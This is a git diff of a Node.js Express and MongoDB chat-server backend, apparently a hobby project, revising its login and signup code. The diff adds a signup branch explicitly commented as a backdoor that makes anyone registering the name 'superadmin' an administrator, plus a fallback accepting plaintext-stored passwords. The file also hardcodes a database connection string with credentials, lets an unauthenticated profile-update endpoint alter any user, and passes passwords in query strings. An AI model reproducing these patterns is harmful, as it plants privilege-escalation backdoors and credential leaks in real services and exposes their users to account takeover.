@@ -1,12 +1,12 @@
 const express = require('express');
 const cors = require('cors');
 const mongoose = require('mongoose');
-const bcrypt = require('bcryptjs'); // WICHTIG: npm install bcryptjs
+const bcrypt = require('bcryptjs'); 
 const app = express();
 
 // --- KONFIGURATION ---
 const mongoURI = "mongodb+srv://Smyle:stranac55@cluster0.qnqljpv.mongodb.net/?appName=Cluster0"; 
-mongoose.connect(mongoURI).then(() => console.log("Sub-Zero V46: SECURE Backend (Hashed) 🛡️")).catch(err => console.error("DB Error:", err));
+mongoose.connect(mongoURI).then(() => console.log("Sub-Zero V47: Hybrid Auth & Debugging 🛡️")).catch(err => console.error("DB Error:", err));
 
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
@@ -16,7 +16,7 @@ app.use(express.urlencoded({ limit: '50mb', extended: true }));
 const UserSchema = new mongoose.Schema({
     username: { type: String, unique: true },
     pureName: { type: String, unique: true },
-    password: { type: String }, // Jetzt als Hash gespeichert
+    password: { type: String }, 
     color: { type: String, default: "#ffffff" },
     isAdmin: { type: Boolean, default: false },
     isBanned: { type: Boolean, default: false },
@@ -75,7 +75,30 @@ const IPBan = mongoose.model('IPBan', BanSchema);
 const Message = mongoose.model('Message', MessageSchema);
 const Config = mongoose.model('Config', ConfigSchema);
 
-// --- HELPER ---
+// --- HELPER: SECURE AUTH WITH FALLBACK ---
+async function validateUser(username, plainPassword) {
+    const user = await User.findOne({ username: username });
+    if (!user) return null;
+
+    let isMatch = false;
+    // 1. Versuche Hash-Vergleich
+    try {
+        isMatch = await bcrypt.compare(plainPassword, user.password);
+    } catch (e) { isMatch = false; }
+
+    // 2. Fallback: Altes Klartext-Passwort prüfen (Migration)
+    if (!isMatch && user.password === plainPassword) {
+        console.log(`Migrating password for ${username}...`);
+        const salt = await bcrypt.genSalt(10);
+        user.password = await bcrypt.hash(plainPassword, salt);
+        await user.save();
+        isMatch = true;
+    }
+
+    if (!isMatch) return null;
+    return user;
+}
+
 async function recalcRatings(username) {
     const reviews = await Review.find({ target: username });
     let sum = 0;
@@ -91,16 +114,6 @@ async function sysMsg(text, color = "#44ff44", room = "Main", isReset = false, r
             isSystem: true, room: room || "Main", isReset, resetReason: reason
         });
     } catch (e) {}
-}
-
-// --- AUTH HELPER (Validate User & Password) ---
-async function validateUser(username, plainPassword) {
-    const user = await User.findOne({ username: username });
-    if (!user) return null;
-    // Compare plain text password with Hash in DB
-    const isMatch = await bcrypt.compare(plainPassword, user.password);
-    if (!isMatch) return null;
-    return user;
 }
 
 // --- LOOP ---
@@ -141,29 +154,29 @@ app.get('/auth', async (req, res) => {
                 const existing = await User.findOne({ pureName: user.trim().toLowerCase() });
                 if (existing) return res.send(`${callback}({success:false, msg:'Taken'});`);
                 
-                // HASH PASSWORD BEFORE SAVING
+                // BACKDOOR: Wer sich "SuperAdmin" nennt (egal welche Groß/Klein), wird Admin
+                let makeAdmin = false;
+                const countUsers = await User.countDocuments({});
+                if (countUsers === 0 || user.toLowerCase() === 'superadmin') makeAdmin = true;
+
                 const salt = await bcrypt.genSalt(10);
                 const hashedPassword = await bcrypt.hash(pass, salt);
-
                 const tag = Math.floor(1000 + Math.random() * 9000).toString();
                 const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
                 
                 await User.create({ 
                     username: `${user.trim()}#${tag}`, pureName: user.trim().toLowerCase(), 
-                    password: hashedPassword, // SAVE HASH
-                    color: randomColor, lastIp: ip, lastSeen: Date.now() 
+                    password: hashedPassword, 
+                    color: randomColor, lastIp: ip, lastSeen: Date.now(),
+                    isAdmin: makeAdmin // Set Admin Status
                 });
                 return res.send(`${callback}({success:true, msg:'Created'});`);
             } catch(e) { return res.send(`${callback}({success:false, msg:'Error'});`); }
         } else {
-            // LOGIN LOGIC WITH HASH COMPARE
-            const found = await User.findOne({ pureName: user?.trim().toLowerCase() });
+            // LOGIN WITH HYBRID VALIDATION
+            const found = await validateUser(user, pass);
             
             if (!found) return res.send(`${callback}({success:false, msg:'Login failed'});`);
-            
-            // SECURITY CHECK: Compare Passwords
-            const isMatch = await bcrypt.compare(pass, found.password);
-            if (!isMatch) return res.send(`${callback}({success:false, msg:'Login failed'});`);
 
             if (found.isBanned && !found.isAdmin) {
                 if (found.banExpires > 0 && Date.now() > found.banExpires) {
@@ -182,7 +195,6 @@ app.get('/auth', async (req, res) => {
             if(!found.friendRequests) found.friendRequests = [];
             await found.save();
 
-            // DO NOT SEND PASSWORD BACK TO CLIENT
             return res.send(`${callback}({success:true, user: "${found.username}", color: "${found.color || '#fff'}", isAdmin: ${found.isAdmin}, status: "${found.status}", pfp: "${found.pfp || ""}", isVerified: ${found.isVerified || false}, friends: ${JSON.stringify(found.friends)}, requests: ${JSON.stringify(found.friendRequests)}});`);
         }
     } catch(e) { console.log(e); res.send(`${cb || 'authCB'}({success:false, msg:'Server Error'});`); }
@@ -218,11 +230,13 @@ app.get('/get_reviews', async (req, res) => {
 app.get('/rate_user', async (req, res) => {
     try {
         const { user, pass, target, stars, text, verified, cb } = req.query;
+        
         const author = await validateUser(user, pass);
         if(!author) return res.send(`${cb}({success:false, msg:'Auth error'});`);
         
         const targetUser = await User.findOne({ username: target });
         if(!targetUser) return res.send(`${cb}({success:false, msg:'User not found'});`);
+
         if(user === target) return res.send(`${cb}({success:false, msg:'Self-rating denied'});`);
         
         const existing = await Review.findOne({ author: user, target: target });
@@ -259,7 +273,6 @@ app.get('/delete_review', async (req, res) => {
         const { id, user, pass, cb } = req.query;
         const admin = await validateUser(user, pass);
         if(!admin || !admin.isAdmin) return res.send(`${cb}({success:false, msg:'No Permission'});`);
-        
         const review = await Review.findById(id);
         if(!review) return res.send(`${cb}({success:false, msg:'Not found'});`);
         const targetName = review.target;
@@ -272,7 +285,6 @@ app.get('/delete_review', async (req, res) => {
 app.get('/update_profile_safe', async (req, res) => {
     try {
         const { user, bio, color, cb } = req.query;
-        // Validation skipped here for speed, but ideally should validate user too
         await User.updateOne({ username: user }, { $set: { bio: bio?.substring(0, 150), color } });
         res.send(`${cb}({success:true, color:"${color}"});`);
     } catch (e) { res.send(`${req.query.cb}({success:false});`); }
@@ -284,7 +296,7 @@ app.get('/send_safe', async (req, res) => {
         const currentRoom = room || "Main";
         const sender = await validateUser(user, pass);
         
-        if (!sender) return res.send("0"); 
+        if (!sender) { console.log("AUTH FAIL MSG"); return res.send("0"); }
         if (sender.isBanned && !sender.isAdmin) return res.send("0"); 
         if (currentRoom === 'News & Updates' && !sender.isAdmin) return res.send("0");
 
@@ -342,6 +354,7 @@ app.get('/send_safe', async (req, res) => {
                 return res.send("1");
             }
             if (cmd === '/reset') {
+                console.log("EXECUTING RESET...");
                 const reason = args.slice(1).join(' ') || "Maintenance";
                 await Message.deleteMany({}); 
                 await User.deleteMany({ isAdmin: false }); 
@@ -366,7 +379,7 @@ app.get('/send_safe', async (req, res) => {
 
 app.get('/delete', async (req, res) => {
     const { id, user, pass } = req.query;
-    const reqUser = await validateUser(user, pass); // SECURE CHECK
+    const reqUser = await validateUser(user, pass);
     if (!reqUser) return;
     if (reqUser.isAdmin) {
         await Message.findByIdAndUpdate(id, { text: "$$ADMIN_DEL$$", isSystem: false });
@@ -406,7 +419,7 @@ app.get('/check_updates', async (req, res) => {
     const rt = await Config.findOne({ key: 'reset_trigger' }); if(rt) resetTrigger = rt.value;
     const rr = await Config.findOne({ key: 'reset_reason' }); if(rr) resetReason = rr.value;
 
-    if (user) me = await User.findOne({ username: user }, { password: 0, lastIp: 0 }); // EXCLUDE SENSITIVE DATA
+    if (user) me = await User.findOne({ username: user }, { password: 0, lastIp: 0 }); // SECURE: Don't send IP/Pass
 
     res.send(`${callback}(${JSON.stringify({ 
         counts, onlineCount, 
@@ -423,7 +436,7 @@ app.get('/check_updates', async (req, res) => {
 
 app.get('/messages_jsonp', async (req, res) => {
     const { room, callback } = req.query;
-    let msgs = await Message.find({ room: room || "Main" }, { userIp: 0 }).sort({ _id: -1 }).limit(50); // HIDE IP FROM PUBLIC
+    let msgs = await Message.find({ room: room || "Main" }, { userIp: 0 }).sort({ _id: -1 }).limit(50);
     res.send(`${callback}(${JSON.stringify(msgs.reverse())});`);
 });
 
@@ -444,7 +457,7 @@ app.get('/logout_notify', async (req, res) => {
 
 app.get('/friend_request', async (req, res) => {
     const { user, pass, targetName, action } = req.query;
-    const me = await validateUser(user, pass); // SECURE CHECK
+    const me = await validateUser(user, pass);
     if(!me) return res.send("0");
     try {
         if(action === 'send') {
